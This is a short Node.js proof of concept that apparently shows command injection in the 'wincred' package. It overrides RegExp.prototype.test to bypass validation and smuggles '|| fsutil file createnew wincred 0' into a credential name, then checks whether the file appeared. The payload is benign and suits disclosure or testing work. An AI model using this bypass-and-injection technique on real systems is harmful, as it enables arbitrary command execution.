RegExp.prototype.test = () => true;
const wincred = require('wincred');
const fs = require('fs');
const path = './wincred';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
let file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(wincred.getCredential('|| fsutil file createnew wincred 0').finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
}));